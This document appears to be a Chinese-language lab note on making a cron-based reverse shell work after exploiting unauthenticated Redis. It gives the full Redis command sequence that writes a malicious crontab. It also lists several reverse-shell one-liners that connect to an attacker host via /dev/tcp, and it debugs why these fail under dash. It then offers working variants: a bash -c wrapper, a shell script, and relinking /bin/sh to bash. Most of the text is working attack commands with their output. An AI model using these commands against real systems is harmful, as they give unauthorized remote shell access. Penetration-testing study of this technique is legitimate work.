# redis未授权反弹shell失败解决

受害机器：kali；攻击主机：mac；

注意，这里写的是**利用定时任务反弹shell**会出现的问题。

最开始在网上找的poc

```shell
root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
OK
# /var/spool/cron/crontabs
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK
```

很随意的一个poc，会遇到各种各样的问题。

执行完之后，使用`crontab -l`发现并没有定时任务执行，这是因为reids写入的定时文件格式有误，据说ubuntu、Debian都有这个问题，centos可以成功复现。不过今天的重点并不在此。

重点是**用crontab反弹shell**。

直接在受害机上使用`crontab -e`写入定时任务，根据最开始网上的那篇博客，应该这么写

```sh
# 写入定时任务
* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n
# 查看定时任务是否执行
crontab -l
```

然后发现执行了，但是shell没有反弹到mac上；

怎么办？

```sh
# 首先查看系统日志
$ tail -f /var/log/syslog
# 结果如下；表示crontab执行出错
CRON[55318]: (CRON) info (No MTA installed, discarding output)

# 写入如下任务---查看crontab的错误日志
* * * * * '/bin/bash -i >& /dev/tcp/192.168.63.128/7999 0>&1'>/tmp/error.txt 2>&1
# 结果如下
$ cat /tmp/error.txt
 bash: cannot set terminal process group (6868): Inappropriate ioctl for device
 bash: no job control in this shell
 bash: >& /dev/tcp/192.168.63.128/7999 0>&1: No such file or directory
```

### 执行bash命令

/bin/bash没有被找到；crontab使用的shell环境是/bin/sh；

Debian下，`sh->dash`，也就是说，要用dash去把反弹bash，这是出错的根本原因。

```shell
# bash -i >& /dev/tcp/192.168.63.130/7777 0>&1           
dash: 2: Syntax error: Bad fd number
# ^C
# /bin/bash -i >& /dev/tcp/192.168.63.130/7777 0>&1
dash: 3: Syntax error: Bad fd number
# /bin/bash -c >& /dev/tcp/192.168.63.130
```

> 但是dash为什么不能反弹bash？

所以，其实可以使用`bash -c`执行命令，而这个命令是反弹交互式bash shell；

```shell
bash -c "bash -i >& /dev/tcp/192.168.63.130/7777 0>&1"
```

也就是，定时任务反弹shell可以写成这样

```shell
* * * * * *  bash -c "bash -i  >&/dev/tcp/192.168.63.130/7777 0>&1"
```

### 使用脚本文件

```shell
# 编辑shell脚本
$ vim /temp/test.sh
# 文件内容如下
# !/bin/bash
/bin/bash -i >& /dev/tcp/192.168.63.130/7777 0>&1

# 加上执行权限
$ chmod +x /tmp/test.sh

# 修改计划任务
* * * * * * /tmp/test.sh
```

### 修改sh指向

让sh指向bash

```shell
ln -s -f bash /bin/sh
```


### 参考博客
- [很有用的博客](https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)
- [某云玩家博客](https://p0sec.net/index.php/archives/69/)
